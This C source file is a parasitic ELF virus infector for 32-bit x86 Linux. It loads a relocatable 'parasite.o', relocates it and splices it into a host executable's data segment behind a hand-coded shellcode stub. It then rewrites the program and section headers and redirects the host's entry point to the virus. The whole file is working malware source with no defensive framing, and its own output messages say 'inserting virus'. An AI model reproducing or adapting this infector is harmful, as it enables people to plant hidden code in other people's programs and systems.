#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <elf.h>
#include <getopt.h>

#define MAGIC_ENTRY	0x11112222

static int error = 0;
static int run = 0;
char initcode[] = 
	"\x57"			/*	pushl  %edi		*/
	"\x56"			/*	pushl  %esi		*/
	"\x50"			/*	pushl  %eax		*/
	"\x53"			/*	pushl  %ebx		*/
	"\x51"			/*	pushl  %ecx		*/
	"\x52"			/*	pushl  %edx		*/
	"\x68\x33\x33\x22\x22"	/*	pushl  $0x22223333	*/
	"\xbd\x00\x00\x00\x00"  /*	movl $0x0, %ebp		*/
	"\xff\xe5"              /* 	mp *%ebp		*/
;

struct _module {
	Elf32_Ehdr	ehdr;
	Elf32_Shdr*	shdr;
	unsigned long	maddr;
	int		len;
	int		strtabidx;
	char**		section;
};

Elf32_Sym *local_sym_find(
	Elf32_Sym *symtab, int n, char *strtab, const char *name
)
{
	int i;

	for (i = 0; i < n; i++) {
		if (!strcmp(&strtab[symtab[i].st_name], name))
			return &symtab[i];
	}

	return NULL;
}

Elf32_Sym *localall_sym_find(struct _module *module, const char *name)
{
	char *strtab = module->section[module->strtabidx];
	int i;

	for (i = 0; i < module->ehdr.e_shnum; i++) {
		Elf32_Shdr *shdr = &module->shdr[i];

		if (shdr->sh_type == SHT_SYMTAB) {
			Elf32_Sym *sym;

			sym = local_sym_find(
				(Elf32_Sym *)module->section[i],
				shdr->sh_size/sizeof(Elf32_Sym),
				strtab,
				name
			);
			if (sym != NULL) return sym;
		}
	}

	return NULL;
}

void check_module(struct _module *module, int fd)
{
	Elf32_Ehdr *ehdr = &module->ehdr;

	if (read(fd, ehdr, sizeof(*ehdr)) != sizeof(*ehdr)) {
		perror("read");
		exit(1);
	}

/* ELF checks */

	if (strncmp(ehdr->e_ident, ELFMAG, SELFMAG)) {
		fprintf(stderr, "File not ELF\n");
		exit(1);
	}

	if (ehdr->e_type != ET_REL) {
		fprintf(stderr, "ELF type not ET_REL\n");
		exit(1);
	}

	if (ehdr->e_machine != EM_386 && ehdr->e_machine != EM_486) {
		fprintf(stderr, "ELF machine type not EM_386 or EM_486\n");
		exit(1);
	}

	if (ehdr->e_version != EV_CURRENT) {
		fprintf(stderr, "ELF version not current\n");
		exit(1);
	}
}

void load_section(char **p, int fd, Elf32_Shdr *shdr)
{
	if (lseek(fd, shdr->sh_offset, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	*p = (char *)malloc(shdr->sh_size);
	if (*p == NULL) {
		perror("malloc");
		exit(1);
	}

	if (read(fd, *p, shdr->sh_size) != shdr->sh_size) {
		perror("read");
		exit(1);
	}
}

void load_module(struct _module *module, int fd)
{
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr;
	char **sectionp;
	int slen;
	int i;

	check_module(module, fd);

	ehdr = &module->ehdr;
	slen = sizeof(Elf32_Shdr)*ehdr->e_shnum;

	module->shdr = (Elf32_Shdr *)malloc(slen);
	if (module->shdr == NULL) {
		perror("malloc");
		exit(1);
	}

	module->section = (char **)malloc(sizeof(char **)*ehdr->e_shnum);
	if (module->section == NULL) {
		perror("malloc");
		exit(1);
	}

	if (lseek(fd, ehdr->e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

        if (read(fd, module->shdr, slen) != slen) {
                perror("read");
                exit(1);
        }

	for (
		i = 0, sectionp = module->section, shdr = module->shdr;
		i < ehdr->e_shnum;
		i++, sectionp++
	) {
		switch (shdr->sh_type) {
		case SHT_NULL:
		case SHT_NOTE:
		case SHT_NOBITS:
			break;

		case SHT_STRTAB:
			load_section(sectionp, fd, shdr);
			if (i != ehdr->e_shstrndx)
				module->strtabidx = i;
			break;

		case SHT_SYMTAB:
		case SHT_PROGBITS:
		case SHT_REL:
			load_section(sectionp, fd, shdr);
			break;

		default:
			fprintf(
				stderr,
				"No handler for section (type): %i\n",
				shdr->sh_type
			);
			exit(1);
		}

		++shdr;
	}
}

void relocate(struct _module *module, Elf32_Rel *rel, Elf32_Shdr *shdr)
{
	Elf32_Sym *symtab = (Elf32_Sym *)module->section[shdr->sh_link];
	Elf32_Sym *sym = &symtab[ELF32_R_SYM(rel->r_info)];
	Elf32_Addr addr;
	Elf32_Shdr *targshdr = &module->shdr[shdr->sh_info];
	Elf32_Addr dot =  targshdr->sh_addr + rel->r_offset;
	Elf32_Addr *loc = (Elf32_Addr *)(
		module->section[shdr->sh_info] + rel->r_offset
	);
	char *name = &module->section[module->strtabidx][sym->st_name];

	if (ELF32_ST_BIND(sym->st_info) != STB_LOCAL) {
		printf("ERROR: External symbol: %s\n", name);
		return;
		exit(1);
	}

	addr = sym->st_value + module->shdr[sym->st_shndx].sh_addr;

#ifdef DEBUG
	printf("Symbol (%s:%lx) is local\n", name, (unsigned long)addr);
#endif

	if (targshdr->sh_type == SHT_SYMTAB) return;
	if (targshdr->sh_type != SHT_PROGBITS) {
		fprintf(
			stderr,
			"Rel not PROGBITS or SYMTAB (type: %i)\n",
			targshdr->sh_type
		);
		exit(1);
	}

	switch (ELF32_R_TYPE(rel->r_info)) {
	case R_386_NONE:
		break;

	case R_386_PLT32:
	case R_386_PC32:
		*loc -= dot;	/* *loc += addr - dot	*/

	case R_386_32:
		*loc += addr;
		break;

	default:
		fprintf(
			stderr, "No handler for Relocation (type): %i",
			ELF32_R_TYPE(rel->r_info)
		);
		exit(1);
	}
}

void relocate_module(struct _module *module)
{
	int i;

	for (i = 0; i < module->ehdr.e_shnum; i++) {
		if (module->shdr[i].sh_type == SHT_REL) {
			int j;
			Elf32_Rel *relp = (Elf32_Rel *)module->section[i];

			for (
				j = 0;
				j < module->shdr[i].sh_size/sizeof(Elf32_Rel);
				j++
			) {
				relocate(
					module,
					relp,
					&module->shdr[i]
				);

				++relp;
			}
		}
	}
}

int get_symaddr(struct _module *module, const char *symbol)
{
	Elf32_Sym *sym;

	sym = localall_sym_find(module, symbol);
	if (sym == NULL) {
		fprintf(stderr, "No symbol (%s)\n", symbol);
		++error;
		return;
	}

	return (unsigned long)module->shdr[sym->st_shndx].sh_addr
		+ sym->st_value;
}

void print_symaddr(struct _module *module, const char *symbol)
{
	printf("%s: 0x%lx\n", symbol, get_symaddr(module, symbol));
}

void init_module(struct _module *module, unsigned long maddr)
{
	int i;
	unsigned long len = 0;

	module->maddr = maddr;

	for (i = 0; i < module->ehdr.e_shnum; i++) {
		if (module->shdr[i].sh_type != SHT_PROGBITS) continue;

		module->shdr[i].sh_addr = len + maddr;
		len += module->shdr[i].sh_size;
	}

	module->len = len;

	printf("Module length: %i\n", module->len);
	
	relocate_module(module);
}

void do_insert(
	char *filename, int fd, struct _module *module, int where, int bss_len
)
{
	struct stat stat;
	char *data;
	int td, i, null = 0;

	printf("inserting virus at offset %i in host\n", where);

	if (fstat(fd, &stat) < 0) {
		perror("fstat");
		exit(1);
	}

	printf("host file size: %i\n", stat.st_size);

	data = (char *)malloc(stat.st_size);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, data, stat.st_size) < 0) {
		perror("read");
		exit(1);
	}

	td = open("v.tmp", O_WRONLY | O_CREAT | O_EXCL, stat.st_mode);
	if (td < 0) {
		perror("open");
		exit(1);
	}

	if (write(td, data, where) < 0) {
		perror("write");
		exit(1);
	}

	printf(
		"copying virus(%i) at offset %i\n",
		module->len, lseek(td, 0, SEEK_CUR)
	);

	for (i = 0; i < bss_len; i++)
		write(td, &null, 1);

	*(int *)&initcode[12] = get_symaddr(module, "main");
	printf("Main entry point: 0x%x\n", get_symaddr(module, "main"));

	if (write(td, initcode, sizeof(initcode)) < 0) {
		perror("write");
		exit(1);
	}
	
	for (i = 0; i < module->ehdr.e_shnum; i++) {
		if (module->shdr[i].sh_type != SHT_PROGBITS) continue;

                if (
                        write(
                                td, module->section[i], module->shdr[i].sh_size
                        ) != module->shdr[i].sh_size
                ) {
                        perror("write");
                        exit(1);
                }
        }

	if (write(td, data + where, stat.st_size - where) < 0) {
		perror("write");
		exit(1);
	}

	if (rename("v.tmp", filename) < 0) {
		perror("rename");
		exit(1);
	}
}

void fix_module_entry(struct _module *module, int entry)
{
	int i, j;

	for (i = 0; i < module->ehdr.e_shnum; i++) {
		if (module->shdr[i].sh_type != SHT_PROGBITS) continue;

		for (j = 0; j < module->shdr[i].sh_size; j++)
			if (*(int *)&module->section[i][j] == MAGIC_ENTRY) {
				*(int *)&module->section[i][j] = entry;
				return;
			}
        }

	printf("ERROR: entry point not found\n");
	exit(1);
}

void do_attach(char *host, char *parasite)
{
	Elf32_Ehdr ehdr;
	Elf32_Shdr *shdr;
	Elf32_Phdr *phdr;
	char *data, *sdata;
	int i, offset, move = 0, fd, evaddr, bss_len;
	struct _module module;

	fd = open(parasite, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

	load_module(&module, fd);

	close(fd);
	fd = open(host, O_RDWR);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

/* read the ehdr */

	if (read(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("read");
		exit(1);
	}

/* modify the virus so that it knows the correct reentry point */

	printf("host entry point: %x\n", ehdr.e_entry);

/* allocate memory for phdr tables */

	data = (char *)malloc(sizeof(*phdr)*ehdr.e_phnum);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the phdr's */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, data, sizeof(*phdr)*ehdr.e_phnum) < 0) {
		perror("read");
		exit(1);
	}

	phdr = (Elf32_Phdr *)data;

	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type != PT_DYNAMIC) {
			if (phdr->p_type == PT_LOAD && phdr->p_offset) {
/* is this the data segment ? */
				printf("Found PT_LOAD segment...\n");
				printf(
					"p_vaddr:	0x%x\n"
					"p_offset:	%i\n"
					"p_filesz:	%i\n"
					"p_memsz:	%i\n"
					"\n",
					phdr->p_vaddr,
					phdr->p_offset,
					phdr->p_filesz,
					phdr->p_memsz
				);

				offset = phdr->p_offset + phdr->p_filesz;
				bss_len = phdr->p_memsz - phdr->p_filesz;
				init_module(
					&module, phdr->p_vaddr +
					phdr->p_memsz +
					sizeof(initcode)
				);
				fix_module_entry(&module, ehdr.e_entry);
				ehdr.e_entry = phdr->p_vaddr + phdr->p_memsz;
				break;
			}
		}

		++phdr;
	}

/* allocated memory if required to accomodate the shdr tables */

	sdata = (char *)malloc(sizeof(*shdr)*ehdr.e_shnum);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the shdr's */

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, sdata, sizeof(*shdr)*ehdr.e_shnum) < 0) {
		perror("read");
		exit(1);
	}

/* update the shdr's to reflect the insertion of the virus */

	shdr = (Elf32_Shdr *)sdata;

	for (i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += module.len + sizeof(initcode) + bss_len;
		}

		++shdr;
	}

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

/* the shdr's have been updated, so write to disk */

	if (write(fd, sdata, sizeof(*shdr)*ehdr.e_shnum) < 0) {
		perror("read");
		exit(1);
	}

	free(sdata);

/*
	update the phdr's to reflect the extention of the text segment (to
	allow virus insertion)
*/

	phdr = (Elf32_Phdr *)data;

	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type != PT_DYNAMIC) {
			if (move) {
				phdr->p_offset += module.len + bss_len;
			} else if (phdr->p_type == PT_LOAD && phdr->p_offset) {
/* is this the data segment ? */

				phdr->p_filesz += module.len +
					sizeof(initcode) + bss_len;
				phdr->p_memsz += module.len +
					sizeof(initcode) + bss_len;

				printf("phdr->filesz: %i\n", phdr->p_filesz);
				printf("phdr->memsz: %i\n", phdr->p_memsz);
 
				move = 1;
			}
		}

		++phdr;
	}


/* update the phdr's to reflect the insertion of the virus */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (write(fd, data, sizeof(*phdr)*ehdr.e_phnum) < 0) {
		perror("read");
		exit(1);
	}

	free(data);

/* update ehdr to reflect new offsets */

	if (ehdr.e_shoff >= offset) ehdr.e_shoff += module.len +
		sizeof(initcode) + bss_len;
	if (ehdr.e_phoff >= offset) ehdr.e_phoff += module.len +
		sizeof(initcode) + bss_len;

/* ehdr has been updated, write the elf header */

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (write(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("write");
		exit(1);
	}

/* insert the virus */

	do_insert(host, fd, &module, offset, bss_len);
}

int main(int argc, char *argv[])
{
	if (argc != 3) {
		fprintf(stderr, "usage: foo host parasite.o\n");
		exit(1);
	}

	do_attach(argv[1], argv[2]);

	exit(0);
}
